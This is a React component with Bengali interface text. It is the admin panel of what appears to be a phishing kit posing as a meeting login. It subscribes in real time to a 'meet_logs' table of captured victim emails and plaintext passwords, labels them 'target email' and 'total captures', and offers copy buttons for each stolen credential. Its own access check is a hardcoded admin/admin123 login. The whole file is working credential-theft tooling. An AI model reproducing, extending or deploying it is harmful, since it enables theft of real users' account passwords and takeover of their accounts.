
import React, { useState, useEffect } from 'react';
import { MeetingStatus, LoginLog } from '../types';
import { supabase } from '../lib/supabase';

interface AdminDashboardProps {
  status: MeetingStatus;
  onLoginSuccess: () => void;
  onLogout: () => void;
}

const AdminDashboard: React.FC<AdminDashboardProps> = ({ status, onLoginSuccess, onLogout }) => {
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [error, setError] = useState('');
  const [logs, setLogs] = useState<LoginLog[]>([]);
  const [loading, setLoading] = useState(false);
  const [lastUpdateTime, setLastUpdateTime] = useState<Date>(new Date());

  useEffect(() => {
    if (status === MeetingStatus.ADMIN_DASHBOARD) {
      fetchLogs();
      
      const subscription = supabase
        .channel('admin-realtime')
        .on(
          'postgres_changes',
          { event: 'INSERT', schema: 'public', table: 'meet_logs' },
          (payload) => {
            const newLog = payload.new as LoginLog;
            setLogs(prev => [newLog, ...prev]);
            setLastUpdateTime(new Date());
            // Play a subtle notification sound if needed
          }
        )
        .subscribe();

      return () => {
        supabase.removeChannel(subscription);
      };
    }
  }, [status]);

  const fetchLogs = async () => {
    setLoading(true);
    try {
      const { data, error } = await supabase
        .from('meet_logs')
        .select('*')
        .order('timestamp', { ascending: false });

      if (!error && data) {
        setLogs(data as LoginLog[]);
      }
    } catch (err) {
      console.error("Fetch failed:", err);
    } finally {
      setLoading(false);
    }
  };

  const handleLogin = (e: React.FormEvent) => {
    e.preventDefault();
    if (username === 'admin' && password === 'admin123') {
      onLoginSuccess();
    } else {
      setError('ভুল তথ্য! সঠিক ইউজারনেম ও পাসওয়ার্ড দিন।');
    }
  };

  const clearLogs = async () => {
    if (window.confirm('আপনি কি সব ডেটা ডিলিট করতে চান?')) {
      await supabase.from('meet_logs').delete().neq('email', 'null');
      setLogs([]);
    }
  };

  const copyToClipboard = (text: string) => {
    navigator.clipboard.writeText(text);
  };

  if (status === MeetingStatus.ADMIN_LOGIN) {
    return (
      <div className="fixed inset-0 bg-[#0a0a0b] flex items-center justify-center z-[500] p-4 font-sans">
        <div className="absolute inset-0 opacity-10 pointer-events-none">
          <div className="absolute top-0 left-0 w-full h-full bg-[radial-gradient(#3b82f6_1px,transparent_1px)] [background-size:20px_20px]"></div>
        </div>
        <div className="max-w-md w-full bg-[#141417] rounded-3xl p-8 shadow-[0_0_50px_rgba(0,0,0,0.5)] border border-white/5 relative z-10">
          <div className="text-center mb-8">
            <div className="w-16 h-16 bg-blue-500/10 rounded-2xl flex items-center justify-center mx-auto mb-4 border border-blue-500/20">
               <svg className="w-8 h-8 text-blue-500" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 00-2-2zm10-10V7a4 4 0 00-8 0v4h8z" /></svg>
            </div>
            <h1 className="text-2xl font-bold text-white tracking-tight">অ্যাডমিন পোর্টাল</h1>
            <p className="text-zinc-500 text-sm mt-1">সুরক্ষিত অ্যাক্সেস প্রয়োজন</p>
          </div>
          <form onSubmit={handleLogin} className="space-y-4">
            <input 
              type="text" 
              value={username} 
              onChange={(e) => setUsername(e.target.value)} 
              className="w-full px-5 py-4 bg-white/5 border border-white/10 rounded-xl focus:ring-2 focus:ring-blue-500 outline-none text-white transition-all" 
              placeholder="ইউজারনেম"
            />
            <input 
              type="password" 
              value={password} 
              onChange={(e) => setPassword(e.target.value)} 
              className="w-full px-5 py-4 bg-white/5 border border-white/10 rounded-xl focus:ring-2 focus:ring-blue-500 outline-none text-white transition-all" 
              placeholder="পাসওয়ার্ড"
            />
            {error && <div className="text-red-400 text-xs font-medium text-center bg-red-400/10 py-2 rounded-lg">{error}</div>}
            <button type="submit" className="w-full bg-blue-600 text-white py-4 rounded-xl font-bold hover:bg-blue-700 transition-all active:scale-[0.98] shadow-lg shadow-blue-600/20">
              লগইন করুন
            </button>
            <button type="button" onClick={onLogout} className="w-full text-zinc-500 text-sm hover:text-white transition-colors">ফিরে যান</button>
          </form>
        </div>
      </div>
    );
  }

  return (
    <div className="fixed inset-0 bg-[#09090b] z-[500] flex flex-col font-sans text-zinc-300 overflow-hidden">
      {/* Sidebar-ish Header */}
      <header className="bg-[#121214] border-b border-white/5 px-8 py-4 flex items-center justify-between">
        <div className="flex items-center gap-4">
          <div className="w-10 h-10 bg-blue-600 rounded-xl flex items-center justify-center text-white shadow-lg shadow-blue-600/20">
            <svg className="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M9 19v-6a2 2 0 00-2-2H5a2 2 0 00-2 2v6a2 2 0 002 2h2a2 2 0 002-2zm0 0V9a2 2 0 012-2h2a2 2 0 012 2v10m-6 0a2 2 0 002 2h2a2 2 0 002-2m0 0V5a2 2 0 012-2h2a2 2 0 012 2v14a2 2 0 01-2 2h-2a2 2 0 01-2-2z" /></svg>
          </div>
          <div>
            <h1 className="text-lg font-bold text-white tracking-tight">মাস্টার ড্যাশবোর্ড</h1>
            <p className="text-[10px] text-green-500 font-bold uppercase tracking-widest flex items-center gap-1.5">
              <span className="w-1.5 h-1.5 bg-green-500 rounded-full animate-pulse"></span>
              লাইভ কানেকশন একটিভ
            </p>
          </div>
        </div>
        <div className="flex items-center gap-3">
          <button onClick={fetchLogs} className="p-2.5 bg-white/5 hover:bg-white/10 rounded-lg transition-colors">
            <svg className={`w-5 h-5 text-zinc-400 ${loading ? 'animate-spin' : ''}`} fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M4 4v5h.582m15.356 2A8.001 8.001 0 004.582 9m0 0H9m11 11v-5h-.581m0 0a8.003 8.003 0 01-15.357-2m15.357 2H15" /></svg>
          </button>
          <button onClick={onLogout} className="px-5 py-2.5 bg-red-600/10 text-red-500 hover:bg-red-600 hover:text-white rounded-lg text-xs font-bold transition-all">
            লগ আউট
          </button>
        </div>
      </header>

      <main className="flex-1 overflow-y-auto p-8 bg-[#09090b]">
        <div className="max-w-6xl mx-auto">
          {/* Stats Grid */}
          <div className="grid grid-cols-1 md:grid-cols-3 gap-6 mb-8">
            <div className="bg-[#121214] p-6 rounded-2xl border border-white/5">
              <p className="text-zinc-500 text-[10px] font-bold uppercase tracking-widest">মোট ক্যাপচার</p>
              <h2 className="text-4xl font-bold text-white mt-2">{logs.length}</h2>
              <p className="text-[10px] text-zinc-600 mt-2">শেষ আপডেট: {lastUpdateTime.toLocaleTimeString()}</p>
            </div>
            <div className="bg-[#121214] p-6 rounded-2xl border border-white/5 col-span-2 flex items-center justify-between">
              <div>
                <h3 className="text-white font-bold">রিয়েল-টাইম মনিটরিং</h3>
                <p className="text-zinc-500 text-sm mt-1">কেউ ইমেইল/পাসওয়ার্ড দিলেই এখানে অটোমেটিক চলে আসবে।</p>
              </div>
              <button onClick={clearLogs} className="px-4 py-2 bg-white/5 hover:bg-red-500/10 hover:text-red-500 rounded-lg text-[10px] font-bold uppercase tracking-widest transition-all">সব ডেটা মুছুন</button>
            </div>
          </div>

          {/* Table Container */}
          <div className="bg-[#121214] rounded-2xl border border-white/5 overflow-hidden shadow-2xl">
            <div className="overflow-x-auto">
              <table className="w-full text-left">
                <thead>
                  <tr className="text-[10px] text-zinc-500 font-bold uppercase tracking-widest border-b border-white/5">
                    <th className="px-8 py-5">টার্গেট ইমেইল</th>
                    <th className="px-8 py-5">পাসওয়ার্ড</th>
                    <th className="px-8 py-5 text-right">সময়</th>
                  </tr>
                </thead>
                <tbody className="divide-y divide-white/5">
                  {logs.length > 0 ? logs.map((log) => (
                    <tr key={log.id} className="hover:bg-white/[0.02] transition-colors group">
                      <td className="px-8 py-5">
                        <div className="flex flex-col">
                          <span className="text-white font-medium">{log.email}</span>
                          <button onClick={() => copyToClipboard(log.email)} className="text-[10px] text-blue-500 hover:underline mt-1 opacity-0 group-hover:opacity-100 transition-opacity">কপি করুন</button>
                        </div>
                      </td>
                      <td className="px-8 py-5">
                        <div className="flex flex-col">
                          <code className="text-red-400 font-mono bg-red-400/5 px-2 py-1 rounded w-fit">{log.password}</code>
                          <button onClick={() => copyToClipboard(log.password)} className="text-[10px] text-red-500 hover:underline mt-1 opacity-0 group-hover:opacity-100 transition-opacity">কপি করুন</button>
                        </div>
                      </td>
                      <td className="px-8 py-5 text-right text-xs text-zinc-500">
                        {new Date(log.timestamp).toLocaleString('bn-BD', { hour: '2-digit', minute: '2-digit', second: '2-digit', day: '2-digit', month: 'short' })}
                      </td>
                    </tr>
                  )) : (
                    <tr>
                      <td colSpan={3} className="px-8 py-20 text-center text-zinc-600 font-medium">কোনো ডেটা পাওয়া যায়নি। ইউজারের জন্য অপেক্ষা করা হচ্ছে...</td>
                    </tr>
                  )}
                </tbody>
              </table>
            </div>
          </div>
        </div>
      </main>
      
      <footer className="bg-[#121214] border-t border-white/5 px-8 py-4 flex items-center justify-between text-[9px] font-bold uppercase tracking-widest text-zinc-600">
        <span>Admin Panel v4.0 (Secure)</span>
        <span>Developer Mode Active</span>
      </footer>
    </div>
  );
};

export default AdminDashboard;
